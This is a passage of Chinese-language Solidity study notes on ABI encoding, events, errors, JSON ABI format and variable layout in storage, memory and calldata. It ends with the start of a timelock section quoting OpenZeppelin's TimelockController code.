偏移量 `e` 指向字符串 `"three"` 内容的开始位置，即第 7 行的开始（224 字节）；所以`e = 0x00000000000000000000000000000000000000000000000000000000000000e0`。

注意，根数组的嵌入元素的编码并不互相依赖，且具有对于函数签名`g(string[],uint[][])` 所相同的编码。

然后我们对第一个根数组的长度进行编码：

- `0x0000000000000000000000000000000000000000000000000000000000000002`(第一个根数组的元素数量 2；这些元素本身是 `[1, 2]` 和 `[3]`)

而后我们对第二个根数组的长度进行编码：

- `0x0000000000000000000000000000000000000000000000000000000000000003`(第二个根数组的元素数量 3；这些字符串本身是 `"one"`、`"two"` 和`"three"`)

最后，我们找到根动态数组元素 `[[1, 2], [3]]` 和`["one", "two", "three"]` 的偏移量 `f` 和 `g`。汇编数据的正确顺序如下：

```
0x2289b18c                                                            - 函数签名
 0 - f                                                                - [[1, 2], [3]] 的偏移量
 1 - g                                                                - 第二个参数的偏移量
 2 - 0000000000000000000000000000000000000000000000000000000000000002 - [[1, 2], [3]] 元素计数
 3 - 0000000000000000000000000000000000000000000000000000000000000040 - [1, 2] 的偏移量
 4 - 00000000000000000000000000000000000000000000000000000000000000a0 - [3] 的偏移量
 5 - 0000000000000000000000000000000000000000000000000000000000000002 - [1, 2] 的元素计数
 6 - 0000000000000000000000000000000000000000000000000000000000000001 - 1 的编码
 7 - 0000000000000000000000000000000000000000000000000000000000000002 - 2 的编码
 8 - 0000000000000000000000000000000000000000000000000000000000000001 - [3] 的元素计数
 9 - 0000000000000000000000000000000000000000000000000000000000000003 - 3 的编码
10 - 0000000000000000000000000000000000000000000000000000000000000003 - 第二个参数元素计数
11 - 0000000000000000000000000000000000000000000000000000000000000060 - "one" 的偏移量
12 - 00000000000000000000000000000000000000000000000000000000000000a0 - "two" 的偏移量
13 - 00000000000000000000000000000000000000000000000000000000000000e0 - "three" 的偏移量
14 - 0000000000000000000000000000000000000000000000000000000000000003 - "one" 的字符计数
15 - 6f6e650000000000000000000000000000000000000000000000000000000000 - "one" 的编码
16 - 0000000000000000000000000000000000000000000000000000000000000003 - "two" 的字符计数
17 - 74776f0000000000000000000000000000000000000000000000000000000000 - "two" 的编码
18 - 0000000000000000000000000000000000000000000000000000000000000005 - "three" 的字符计数
19 - 7468726565000000000000000000000000000000000000000000000000000000 - "three" 的编码
```

偏移量 `f` 指向数组 `[[1, 2], [3]]` 内容的开始位置，即第 2 行的开始（64 字节）；所以`f = 0x0000000000000000000000000000000000000000000000000000000000000040`。

偏移量 `g` 指向数组 `["one", "two", "three"]` 内容的开始位置，即第 10 行的开始（320 字节）；所以 `g = 0x0000000000000000000000000000000000000000000000000000000000000140`。











### 事件

事件是以太坊的日志，事件是监视协议的一个抽象。日志项提供了合约的地址、一系列的`indexed`（最多 4 项）和一些任意长度的二进制数据。为了使用合适的类型数据结构来演绎这些功能，事件沿用了既存的 ABI 函数。

给定了事件名称和事件参数之后，我们将其分解为两个子集：已索引的和未索引的。已索引的部分，最多有 3 个（对于非匿名事件）或 4 个（对于匿名事件），被用来与事件签名的 Keccak 哈希一起组成日志项的主题。未索引的部分就组成了事件的字节数组。

这样，一个使用 ABI 的日志项就可以描述为：

- `address`：合约地址（由 以太坊 真正提供）；
- `topics[0]`：`keccak(EVENT_NAME+"("+EVENT_ARGS.map(canonical_type_of).join(",")+")")`
  - （ `canonical_type_of` 是一个可以返回给定参数的权威类型的函数，例如，对 `uint indexed foo` 它会返回 `uint256`）。
  - 如果事件被声明为 `anonymous`，那么 `topics[0]` 不会被生成；
- `topics[n]`：
  - 如果不是匿名事件，为 `abi_encode(EVENT_INDEXED_ARGS[n - 1])`
  - 否则则为 `abi_encode(EVENT_INDEXED_ARGS[n])`（ `EVENT_INDEXED_ARGS` 是已索引的 `EVENT_ARGS`）；
- `data`：`abi_serialise(EVENT_NON_INDEXED_ARGS)`
  - （`EVENT_NON_INDEXED_ARGS` 是未索引的 `EVENT_ARGS`， `abi_serialise` 是一个用来从某个函数返回一系列类型值的 ABI 序列化函数，就像上文所讲的那样）。

对于所有定长的 Solidity 类型， `EVENT_INDEXED_ARGS` 数组会直接包含 32 字节的编码值。

然而，对于 *动态长度的类型* ，包含`string`、 `bytes` 和数组， `EVENT_INDEXED_ARGS` 会包含编码值的 *Keccak 哈希*,而不是直接包含编码值。这样就允许应用程序更有效地查询动态长度类型的值（通过把编码值的哈希设定为主题），但也使应用程序不能对它们还没查询过的已索引的值进行解码。

对于动态长度的类型，应用程序开发者面临在对预先设定的值（如果参数已被索引）的快速检索和对任意数据的清晰处理（需要参数不被索引）之间的权衡。

开发者们可以通过定义两个参数（一个已索引、一个未索引）保存同一个值的方式来解决这种权衡，从而既获得高效的检索又能清晰地处理任意数据。





#### 事件索引参数的编码

对于不是值类型的事件索引参数，如：数组和结构，是不直接存储的，而是存储一个 keccak256-hash 编码。这个编码被定义如下：

- `bytes` 和 `string` 的编码只是字符串的内容，没有任何填充或长度前缀。
- 结构体的编码是其成员编码的拼接，总是填充为 32 字节的倍数（即便是 `bytes` 和 `string` 类型）。
- 数组(包含动态和静态大小的数组)的编码是其元素的编码的拼接，总是填充为 32 字节的倍数（即便是 `bytes` 和 `string` 类型），并且没有长度前缀

上面的规范，像往常一样，负数会符号扩展填充，而不是零填充。 `bytesNN`类型在右边填充，而 `uintNN` / `intNN` 在左边填充。

⚠️ 警告: 如果一个结构体包含一个以上的动态大小的数组，那么其编码会模糊有歧义。正因为如此，要经常重新检查事件数据，不能仅仅依靠索引参数的结果









### 错误编码

在合约内部发生错误的情况下，合约可以使用一个特殊的操作码来中止执行，并恢复所有的状态变化。除了这些效果之外，可以返回描述性数据给调用者。这种描述性数据是对错误及其参数的编码，其方式与函数调用的数据相同。

例如，让我们考虑以下合约，其 `transfer` 功能在出现"余额不足"时，提示自定义错误:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract TestToken {
    error InsufficientBalance(uint256 available, uint256 required);
    function transfer(address to, uint amount) public pure {
        revert InsufficientBalance(0, amount);
    }
}
```

返回错误数据是以函数调用相同的方式编码， `InsufficientBalance(0, amount)` 与函数 `InsufficientBalance(uint256,uint256)` 编码一样。 例如为：`0xcf479181`, `uint256(0)`, `uint256(amount)`.

⚠️ 注意：错误的选择器 `0x00000000` 和 `0xffffffff` 被保留将来使用。

⚠️ 注意：永远不要相信错误数据。默认情况下，错误数据会通过外部调用链向上冒泡，这意味着一个合约可能会收到一个它直接调用的任何合约中没有定义的错误。此外，任何合约都可以通过返回与错误签名相匹配的数据来伪造任何错误，即使该错误没有在任何地方定义。









### JSON

合约接口的 JSON 格式是用来描述函数，事件或错误描述的一个数组。



#### 函数的JSON

一个函数的描述是一个有如下字段的 JSON 对象：

- `type`： `"function"`、 `"constructor"` 或 `"fallback"`
- `name`：函数名称；`inputs`：对象数组，每个数组对象会包含：
  - `name`：参数名称；
  - `type`：参数的权威类型（详见下文）
  - `components`：供 元组(tuple) 类型使用（详见下文）
- `outputs`：一个类似于 `inputs`的对象数组，如果函数无返回值时可以被省略；
- `payable`：如果函数接受 以太币 ，为 `true`；缺省为 `false`；
- `stateMutability`：为下列值之一： `pure` ， `view`， `nonpayable` 和 `payable`。

`type` 可以被省略，缺省为 `"function"`。

⚠️ 注意：构造函数 constructor 和 fallback 函数没有 `name` 或 `outputs`。fallback 函数也没有 `inputs`。

- 向 non-payable（即不接受 以太币 ）的函数发送非零值的以太币 会回退交易。
- 状态可变性 `nonpayable` 是默认的，不用显示指定。



#### 事件的JSON

一个事件描述是一个有极其相似字段的 JSON 对象：

- `type`：总是 `"event"`；
- `name`：事件名称；`inputs`：对象数组，每个数组对象会包含：
  - `name`：参数名称；
  - `type`：参数的权威类型（相见下文）；
  - `components`：供 元组(tuple) 类型使用（详见下文）；
  - `indexed`：如果此字段是日志的一个主题，则为 `true`；否则为
    `false`。
- `anonymous`：如果事件被声明为 `anonymous`，则为 `true`。





#### 错误的JSON



错误这是一下类似的形式：

- `type`: 为 `"error"`
- `name`: 错误的名称。`inputs`: 对象数组，每个元素包含：
  - `name`: 参数名称。
  - `type`: 参数的规范类型（更多详细内容见下文）。
  - `components`: 用于元组类型 (更多详细内容见下文).

⚠️ 注意：在 JSON 数组中可能有多个名称相同、甚至签名相同的错误。例如，如果错误来自智能合约中的不同文件，或引用自另一个智能合约。

对于 ABI 来说，它仅取决于错误的名称，而不是它的定义位置。



**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Test {
    bytes32 b;

    constructor() {
        b = "0x12";
    }

    event Event(uint256 indexed a, bytes32 b);
    error InsufficientBalance(uint256 available, uint256 required);

    function foo(uint256 a) public {
        emit Event(a, b);
    }
}
```

可由如下 JSON 来表示：

```json
[
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{ "internalType": "uint256", "name": "available", "type": "uint256" },
			{ "internalType": "uint256", "name": "required", "type": "uint256" }
		],
		"name": "InsufficientBalance",
		"type": "error"
	},
	{
		"anonymous": false,
		"inputs": [
			{ "indexed": true, "internalType": "uint256", "name": "a", "type": "uint256" },
			{ "indexed": false, "internalType": "bytes32", "name": "b", "type": "bytes32" }
		],
		"name": "Event",
		"type": "event"
	},
	{
		"inputs": [{ "internalType": "uint256", "name": "a", "type": "uint256" }],
		"name": "foo",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
```





#### 处理元组（tuple）类型

尽管名称被有意地不作为 ABI 编码的一部分，但将它们包含进 JSON 来显示给最终用户是非常合理的。其结构会按下列方式进行嵌套：

一个拥有 `name`、 `type` 和潜在的 `components`成员的对象描述了某种类型的变量。 直至到达一个 元组(tuple)类型且到那点的存储在 `type` 属性中的字符串以 `tuple`为前缀，也就是说，在 `tuple` 之后紧跟一个 `[]` 或有整数 `k` 的`[k]`，才能确定一个 元组(tuple)。 元组(tuple) 的组件元素会被存储在成员`components`中，它是一个数组类型，且与顶级对象具有同样的结构，只是在这里不允许已索引的（`indexed`）数组元素。



**示例：**

```solidity
pragma solidity >=0.7.5 <0.9.0;
pragma abicoder v2;

contract Test {
  struct S { uint a; uint[] b; T[] c; }
  struct T { uint x; uint y; }
  function f(S memory, T memory, uint) public pure { }
  function g() public pure returns (S memory, T memoryt, uint) {}
}
```

可由如下 JSON 来表示：

```json
[
  {
    "name": "f",
    "type": "function",
    "inputs": [
      {
        "name": "s",
        "type": "tuple",
        "components": [
          {
            "name": "a",
            "type": "uint256"
          },
          {
            "name": "b",
            "type": "uint256[]"
          },
          {
            "name": "c",
            "type": "tuple[]",
            "components": [
              {
                "name": "x",
                "type": "uint256"
              },
              {
                "name": "y",
                "type": "uint256"
              }
            ]
          }
        ]
      },
      {
        "name": "t",
        "type": "tuple",
        "components": [
          {
            "name": "x",
            "type": "uint256"
          },
          {
            "name": "y",
            "type": "uint256"
          }
        ]
      },
      {
        "name": "a",
        "type": "uint256"
      }
    ],
    "outputs": []
  }
]
```





### 严格编码模式

严格的编码模式与上述正式规范中定义的编码完全相同，但使偏移量必须尽可能小，同时不能在数据区域产生重叠，也不允许有间隙。

通常，ABI 解码器是以直接的方式编写的，只是遵循偏移量指针，但有些解码器可能强制执行严格模式。Solidity ABI 解码器目前并不强制执行严格模式，但编码器总是以严格模式创建数据。





















## 变量的布局



### 状态变量在storage中的布局

合约的状态变量以一种紧凑的方式存储在区块链存储中，**有时多个值会使用同一个存储槽。**

==除了动态大小的数组和mapping，数据的存储方式是从0开始连续放置在storage中。对于每个变量，根据其类型确定字节大小==。



存储大小少于32字节的多个变量会被打包到一个存储槽（storage slot）中，规定如下：

+ 存储插槽的第一项会以低位对齐的方式存储 
+ 值类型仅使用存储它们所需的字节
+ 如果存储插槽中的剩余空间不足以存储一个值类型，那么它会被存入下一个存储插槽
+ 结构体和数组数据总是会开启一个新插槽（但结构体和数组中的各元素，则按规则紧密打包）
+ 结构体和数组之后的数据也会开启一个新插槽

对于使用继承的合约，状态变量的排序由 C3 线性化合约顺序（顺序从最基类合约开始）确定。如果上述规则成立，那么来自不同的合约的状态变量会共享一个存储插槽。

结构体和数组中的成员变量会存储在一起，就像它们单独声明时一样。





#### mapping和动态数组

由于 mapping 和动态数组不可预知大小，不能在状态变量之间存储他们。相反，他们自身根据以上规则仅占用 32 个字节，然后他们包含的元素的存储的起始位置，则是通过 Keccak-256 哈希计算来确定。



**起始位置：**

假设 mapping 或动态数组根据上述存储规则最终可确定某个位置 `p` 。

- 对于动态数组，此插槽中会存储数组中元素的数量（字节数组和字符串除外，见下文）。
- 对于 mapping，该插槽未被使用（为空），但它仍是需要的，以确保两个彼此挨着 mapping，他们的内容在不同的位置上。

数组的元素会从 `keccak256(p)` 开始；它的布局方式与静态大小的数组相同。一个元素接着一个元素，如果元素的长度不超过 16 字节，就有可能共享存储槽。

动态数组的数组会递归地应用这一规则，例如，如何确定 `x[i][j]`元素的位置，其中 `x` 的类型是 `uint24[][]`，计算方法如下（假设`x`本身存储在槽 `p`）: 槽位于 `keccak256(keccak256(p) + i) + floor(j / floor(256 / 24))`，且可以从槽数据 `v`得到元素内容，使用 `(v >> ((j % floor(256 / 24)) * 24)) & type(uint24).max`.

mapping 中的键 `k` 所对应的槽会位于 `keccak256(h(k) . p)` ，其中 `.`是连接符， `h` 是一个函数，根据键的类型：

- 值类型， `h` 与在内存中存储值的方式相同的方式将值填充为 32 字节。
- 对于字符串和字节数组， `h(k)` 只是未填充的数据。

如果映射值是一个非值类型，计算槽位置标志着数据的开始位置。例如，如果值是结构类型，你必须添加一个与结构成员相对应的偏移量才能到达该成员。





**示例：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract C {
    struct S {
        uint16 a;
        uint16 b;
        uint256 c;
    }
    uint256 x;
    mapping(uint256 => mapping(uint256 => S)) data;
}
```

让我们计算一下 `data[4][9].c` 的存储位置。映射本身的位置是 `1`（前面有 32 字节变量 `x` ）。 因此 `data[4]` 存储在`keccak256(uint256(4) . uint256(1))`。 `data[4]` 的类型又是一个映射，`data[4][9]` 的数据开始于槽位`keccak256(uint256(9). keccak256(uint256(4). uint256(1))`。

在结构 `S` 的成员 `c` 中的槽位偏移是 `1`，因为 `a` 和`b`被装在一个槽位中。 最后 `data[4][9].c` 的插槽位置是`keccak256(uint256(9) . keccak256(uint256(4) . uint256(1)) + 1`.该值的类型是 `uint256`，所以它使用一个槽。









#### bytes和string

`bytes` 和 `string` 编码是一样的。

一般来说，编码与 `bytes1[]`类似，即有一个槽用于存放数组本身同时还有一个数据区，数据区位置使用槽的`keccak256` hash 计算。然而，对于短字节数组（短于 32 字节），数组元素与长度一起存储在同一个槽中。

具体地说：如果数据长度小于等于 `31`字节，则元素存储在高位字节（左对齐），最低位字节存储值 `length * 2`。如果数据长度大于等于 32 字节，则在主插槽 `p` 存储 `length * 2 + 1`，数据照常存储在 `keccak256(p)` 中。因此，可以通过检查是否设置了最低位：短（未设置最低位）和长（设置最低位）来区分短数组和长数组。

⚠️ 注意: 目前不支持处理无效编码的插槽，但可能在将来添加。如果你通过 IR 编译，读取一个无效的编码槽会导致 `Panic(0x22)` 错误。









#### JSON输出

合约的存储布局可以通过 standard JSON interface 获取到。 输出 JSON 对象包含 2 个字段 `storage` 和 `types` 。`storage` 对象是一个数组。

文件： `fileA` 合约： `contract A { uint x; }`存储布局，它的每个元素有如下的形式。

```
{
    "astId": 2,
    "contract": "fileA:A",
    "label": "x",
    "offset": 0,
    "slot": "0",
    "type": "t_uint256"
}
```

每个字段说明如下：

- `astId` 是状态变量声明的 AST 节点的 id。
- `contract` 是合约的名称，包括其路径作为前缀。
- `label` 是状态变量的名称。
- `offset` 是根据编码在存储槽内以字节为单位的偏移量。
- `slot` 是状态变量所在或开始的存储槽。这个数字可能非常大，因此它的 JSON 值被表示为一个字符串。
- `type` 是一个标识符，作为变量类型信息的关键(如下所述)。

给定的 `type`，在本例中 `t_uint256` 代表 `types`中的一个元素，其形式为：

```
{
    "encoding": "inplace",
    "label": "uint256",
    "numberOfBytes": "32",
}
```

而

+ `encoding` 数据在存储中如何编码，可能的数值是：

  - `inplace`: 数据在存储中连续排列 (见 前面状态变量储存结构`).

  - `mapping`: Keccak-256 基于哈希的方法 (见 前面前面映射和动态数组`).

  - `dynamic_array`: Keccak-256 基于哈希的方法 (见 前面映射和动态数组`).

  - `bytes`: 单槽或基于 Keccak-256 哈希的方法，取决于数据大小 (见 前面 bytes).

- `label` 是规范的类型名称 。
- `numberOfBytes` 是使用的字节数(十进制字符串) 注意，如果`numberOfBytes>32` 意味着使用了一个以上的槽。

除了上述四个外，有些类型还有额外的信息。映射包含其 `key` 和 `value`类型(再次引用该类型映射中元素类型)，数组有其 `base` 类型，结构以与顶层`storage` 相同的格式列出其 `members` (见
:ref:`前面JSON 输出`).

⚠️ 注意: 合约的存储布局的 JSON 输出格式仍被认为是实验性的，即使在 Solidity 的非突破性版本更新中也可能会发生变化。





**示例：**

下面的例子显示了一个合约和它的存储布局，包含值类型和引用类型、被编码打包的类型和嵌套类型。

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.0 <0.9.0;
contract A {
    struct S {
        uint128 a;
        uint128 b;
        uint[2] staticArray;
        uint[] dynArray;
    }

    uint x;
    uint y;
    S s;
    address addr;
    mapping (uint => mapping (address => bool)) map;
    uint[] array;
    string s1;
    bytes b1;
}
```



```json
{
	"storage": [
		{
			"astId": 15,
			"contract": "fileA:A",
			"label": "x",
			"offset": 0,
			"slot": "0",
			"type": "t_uint256"
		},
		{
			"astId": 17,
			"contract": "fileA:A",
			"label": "y",
			"offset": 0,
			"slot": "1",
			"type": "t_uint256"
		},
		{
			"astId": 20,
			"contract": "fileA:A",
			"label": "s",
			"offset": 0,
			"slot": "2",
			"type": "t_struct(S)13_storage"
		},
		{
			"astId": 22,
			"contract": "fileA:A",
			"label": "addr",
			"offset": 0,
			"slot": "6",
			"type": "t_address"
		},
		{
			"astId": 28,
			"contract": "fileA:A",
			"label": "map",
			"offset": 0,
			"slot": "7",
			"type": "t_mapping(t_uint256,t_mapping(t_address,t_bool))"
		},
		{
			"astId": 31,
			"contract": "fileA:A",
			"label": "array",
			"offset": 0,
			"slot": "8",
			"type": "t_array(t_uint256)dyn_storage"
		},
		{
			"astId": 33,
			"contract": "fileA:A",
			"label": "s1",
			"offset": 0,
			"slot": "9",
			"type": "t_string_storage"
		},
		{
			"astId": 35,
			"contract": "fileA:A",
			"label": "b1",
			"offset": 0,
			"slot": "10",
			"type": "t_bytes_storage"
		}
	],
	"types": {
		"t_address": {
			"encoding": "inplace",
			"label": "address",
			"numberOfBytes": "20"
		},
		"t_array(t_uint256)2_storage": {
			"base": "t_uint256",
			"encoding": "inplace",
			"label": "uint256[2]",
			"numberOfBytes": "64"
		},
		"t_array(t_uint256)dyn_storage": {
			"base": "t_uint256",
			"encoding": "dynamic_array",
			"label": "uint256[]",
			"numberOfBytes": "32"
		},
		"t_bool": {
			"encoding": "inplace",
			"label": "bool",
			"numberOfBytes": "1"
		},
		"t_bytes_storage": {
			"encoding": "bytes",
			"label": "bytes",
			"numberOfBytes": "32"
		},
		"t_mapping(t_address,t_bool)": {
			"encoding": "mapping",
			"key": "t_address",
			"label": "mapping(address => bool)",
			"numberOfBytes": "32",
			"value": "t_bool"
		},
		"t_mapping(t_uint256,t_mapping(t_address,t_bool))": {
			"encoding": "mapping",
			"key": "t_uint256",
			"label": "mapping(uint256 => mapping(address => bool))",
			"numberOfBytes": "32",
			"value": "t_mapping(t_address,t_bool)"
		},
		"t_string_storage": {
			"encoding": "bytes",
			"label": "string",
			"numberOfBytes": "32"
		},
		"t_struct(S)13_storage": {
			"encoding": "inplace",
			"label": "struct A.S",
			"members": [
				{
					"astId": 3,
					"contract": "fileA:A",
					"label": "a",
					"offset": 0,
					"slot": "0",
					"type": "t_uint128"
				},
				{
					"astId": 5,
					"contract": "fileA:A",
					"label": "b",
					"offset": 16,
					"slot": "0",
					"type": "t_uint128"
				},
				{
					"astId": 9,
					"contract": "fileA:A",
					"label": "staticArray",
					"offset": 0,
					"slot": "1",
					"type": "t_array(t_uint256)2_storage"
				},
				{
					"astId": 12,
					"contract": "fileA:A",
					"label": "dynArray",
					"offset": 0,
					"slot": "3",
					"type": "t_array(t_uint256)dyn_storage"
				}
			],
			"numberOfBytes": "128"
		},
		"t_uint128": {
			"encoding": "inplace",
			"label": "uint128",
			"numberOfBytes": "16"
		},
		"t_uint256": {
			"encoding": "inplace",
			"label": "uint256",
			"numberOfBytes": "32"
		}
	}
}
```







### 变量在memory中的布局

Solidity 保留了四个 32 字节的插槽，字节范围(包括端点)特定用途如下：

- `0x00` - `0x3f` (64 字节): 用于哈希方法的**暂存空间**（临时空间）
- `0x40` - `0x5f` (32 字节): 当前分配的内存大小(也作为**空闲内存指针**)
- `0x60` - `0x7f` (32 字节): **零位插槽**

**暂存空间**可以在语句之间使用 (例如在内联汇编中)。**零位插槽**用作动态内存数组的初始值，并且永远不应写入（空闲内存指针最初指向`0x80`）.Solidity 总是将新对象放在**空闲内存指针**上，并且内存永远不会被释放(将来可能会改变)。

Solidity 中的内存数组中的元素始终占据 32 字节的倍数（对于 `bytes1[]`总是这样，但不适用与 `bytes` 和 `string` ）。

多维内存数组是指向内存数组的指针，动态数组的长度存储在数组的第一个插槽中，然后是数组元素。

⚠️ 警告: Solidity 中有一些需要临时存储区的操作需要大于 64 个字节，因此无法放入暂存空间。它们将被放置在空闲内存指向的位置，但是由于使用寿命短，指针不会更新。内存可以归零，也可以不归零。因此，不应指望空闲内存指针指向归零内存区域。

尽管使用 `msize`到达绝对归零的内存区域似乎是一个好主意，但使用此类非临时指针而不更新空闲内存指针可能会产生意外结果。





**与存储中布局的不同：**

如上所述，在内存中的布局与在 **存储中** 有一些不同。下面是一些例子：



**数组的不同：**

下面的数组在存储中占用 32 字节（1 个槽），但在内存中占用 128 字节（4 个元素，每个 32 字节）。

```
uint8[4] a;
```



**结构体的不同：**

下面的结构体在存储中占用 96 (1 个槽，每个 32 字节) ，但在内存中占用 128
个字节（4 个元素每个 32 字节）。

```solidity
struct S {
    uint a;
    uint b;
    uint8 c;
    uint8 d;
}
```













### calldata 布局

假定：函数调用的输入数据采用 ABI 规范。

其中，ABI 规范要求将参数填充为 32 的倍数 个字节。内部函数调用使用不同的约定。

合约构造函数的参数直接附加在合约代码的末尾，也采用 ABI 编码。构造函数将通过硬编码偏移量，而不是通过使用 `codesize` 操作码来访问它们，因为在将数据追加到代码时，它就会会改变。







### 清理变量

当一个值短于 256 位时，在某些情况下，剩余位必须被清理。编译器在设计时，会在操作数据之前清理这些剩余位，以避免剩余位中潜在垃圾数据在操作产生任何不利影响。

- 在将一个值写入存储器之前，需要清除剩余的位，因为存储器的内容可以用于计算哈希值或作为消息调用的数据发送。
- 同样，在将一个值存储到存储器中之前，也需要清除剩余的位，因为否则可以观察到垃圾数据。
- 如果紧接着的操作不受影响，就不会清理位。例如，由于任何非零值都会被 `JUMPI` 指令认为是 `true`，所以在布尔值被用作条件判断之前，不需要清理它们。 `JUMPI`。
- 编译器会在将输入数据（input data）加载到堆栈时，会对其进行清理。

⚠️ 注意：通过内联汇编的访问数据没有此操作。如果使用内联汇编来访问短于 256 位的 Solidity 变量，编译器不保证该值被正确清理。

不同的类型有不同的清理无效值的规则：

| Type              | Valid Values       | Invalid Values Mean                                          |
| ----------------- | ------------------ | ------------------------------------------------------------ |
| enum of nmembers  | 0 until n - 1      | exception                                                    |
| bool              | 0 or 1             | 1                                                            |
| signed integers   | sign-extended word | currently silently wraps; in the future exceptions will be thrown |
| unsigned integers | higher bits zeroed | currently silently wraps; in the future exceptions will be thrown |









## 合约安全

### 时间锁合约

**说明：**

+ 对合约的一种保护机制。任何更新操作都是先进入队列，经过一段时间后，才可以真正执行。
+ DeFi类Dapp都会加时间锁。



**注意：**

+ 测试合约 `Main`
+ 时间锁合约 `TimeLock`
+ `Main` 内的函数，只能由 `TimeLock` 调用。
+ `TimeLock` 不能立即调用，需要加事件延迟。





**示例**：以下代码来自 [OpenZeppelin TimelockController](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/TimelockController.sol)

```solidity
contract TimelockController is AccessControl, IERC721Receiver, IERC1155Receiver {
    bytes32 public constant TIMELOCK_ADMIN_ROLE = keccak256("TIMELOCK_ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");
    bytes32 public constant CANCELLER_ROLE = keccak256("CANCELLER_ROLE");
    uint256 internal constant _DONE_TIMESTAMP = uint256(1);

    mapping(bytes32 => uint256) private _timestamps;
    uint256 private _minDelay;

    /**
     * @dev Emitted when a call is scheduled as part of operation `id`.
     */
    event CallScheduled(
        bytes32 indexed id,
        uint256 indexed index,
        address target,
        uint256 value,
        bytes data,
        bytes32 predecessor,
        uint256 delay
    );

    /**
     * @dev Emitted when a call is performed as part of operation `id`.
     */
    event CallExecuted(bytes32 indexed id, uint256 indexed index, address target, uint256 value, bytes data);

    /**
     * @dev Emitted when operation `id` is cancelled.
     */
    event Cancelled(bytes32 indexed id);

    /**
     * @dev Emitted when the minimum delay for future operations is modified.
     */
    event MinDelayChange(uint256 oldDuration, uint256 newDuration);

    /**
     * @dev Initializes the contract with the following parameters:
     *
     * - `minDelay`: initial minimum delay for operations
     * - `proposers`: accounts to be granted proposer and canceller roles
     * - `executors`: accounts to be granted executor role
     * - `admin`: optional account to be granted admin role; disable with zero address
     *
     * IMPORTANT: The optional admin can aid with initial configuration of roles after deployment
     * without being subject to delay, but this role should be subsequently renounced in favor of
     * administration through timelocked proposals. Previous versions of this contract would assign
     * this admin to the deployer automatically and should be renounced as well.
     */
    constructor(uint256 minDelay, address[] memory proposers, address[] memory executors, address admin) {
        _setRoleAdmin(TIMELOCK_ADMIN_ROLE, TIMELOCK_ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, TIMELOCK_ADMIN_ROLE);
        _setRoleAdmin(EXECUTOR_ROLE, TIMELOCK_ADMIN_ROLE);
        _setRoleAdmin(CANCELLER_ROLE, TIMELOCK_ADMIN_ROLE);

        // self administration
        _setupRole(TIMELOCK_ADMIN_ROLE, address(this));

        // optional admin
        if (admin != address(0)) {
            _setupRole(TIMELOCK_ADMIN_ROLE, admin);
        }

        // register proposers and cancellers
        for (uint256 i = 0; i < proposers.length; ++i) {
            _setupRole(PROPOSER_ROLE, proposers[i]);
            _setupRole(CANCELLER_ROLE, proposers[i]);
        }

        // register executors
        for (uint256 i = 0; i < executors.length; ++i) {
            _setupRole(EXECUTOR_ROLE, executors[i]);
        }

        _minDelay = minDelay;
        emit MinDelayChange(0, minDelay);
    }

    /**
     * @dev Modifier to make a function callable only by a certain role. In
     * addition to checking the sender's role, `address(0)` 's role is also
     * considered. Granting a role to `address(0)` is equivalent to enabling
     * this role for everyone.
     */
    modifier onlyRoleOrOpenRole(bytes32 role) {
        if (!hasRole(role, address(0))) {
            _checkRole(role, _msgSender());
        }
        _;
    }

    /**
     * @dev Contract might receive/hold ETH as part of the maintenance process.
     */
    receive() external payable {}

    /**
     * @dev See {IERC165-supportsInterface}.
     */
    function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, AccessControl) returns (bool) {
        return interfaceId == type(IERC1155Receiver).interfaceId || super.supportsInterface(interfaceId);
    }

    /**
     * @dev Returns whether an id correspond to a registered operation. This
     * includes both Pending, Ready and Done operations.
     */
    function isOperation(bytes32 id) public view virtual returns (bool registered) {
        return getTimestamp(id) > 0;
    }

    /**
     * @dev Returns whether an operation is pending or not.
     */
    function isOperationPending(bytes32 id) public view virtual returns (bool pending) {
        return getTimestamp(id) > _DONE_TIMESTAMP;
    }

    /**
     * @dev Returns whether an operation is ready or not.
     */
    function isOperationReady(bytes32 id) public view virtual returns (bool ready) {
        uint256 timestamp = getTimestamp(id);
        return timestamp > _DONE_TIMESTAMP && timestamp <= block.timestamp;
    }

    /**
     * @dev Returns whether an operation is done or not.
     */
    function isOperationDone(bytes32 id) public view virtual returns (bool done) {
        return getTimestamp(id) == _DONE_TIMESTAMP;
    }

    /**
     * @dev Returns the timestamp at which an operation becomes ready (0 for
     * unset operations, 1 for done operations).
     */
    function getTimestamp(bytes32 id) public view virtual returns (uint256 timestamp) {
        return _timestamps[id];
    }

    /**
     * @dev Returns the minimum delay for an operation to become valid.
     *
     * This value can be changed by executing an operation that calls `updateDelay`.
     */
    function getMinDelay() public view virtual returns (uint256 duration) {
        return _minDelay;
    }

    /**
     * @dev Returns the identifier of an operation containing a single
     * transaction.
     */
    function hashOperation(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt
    ) public pure virtual returns (bytes32 hash) {
        return keccak256(abi.encode(target, value, data, predecessor, salt));
    }

    /**
     * @dev Returns the identifier of an operation containing a batch of
     * transactions.
     */
    function hashOperationBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata payloads,
        bytes32 predecessor,
        bytes32 salt
    ) public pure virtual returns (bytes32 hash) {
        return keccak256(abi.encode(targets, values, payloads, predecessor, salt));
    }

    /**
     * @dev Schedule an operation containing a single transaction.
     *
     * Emits a {CallScheduled} event.
     *
     * Requirements:
     *
     * - the caller must have the 'proposer' role.
     */
    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) public virtual onlyRole(PROPOSER_ROLE) {
        bytes32 id = hashOperation(target, value, data, predecessor, salt);
        _schedule(id, delay);
        emit CallScheduled(id, 0, target, value, data, predecessor, delay);
    }

    /**
     * @dev Schedule an operation containing a batch of transactions.
     *
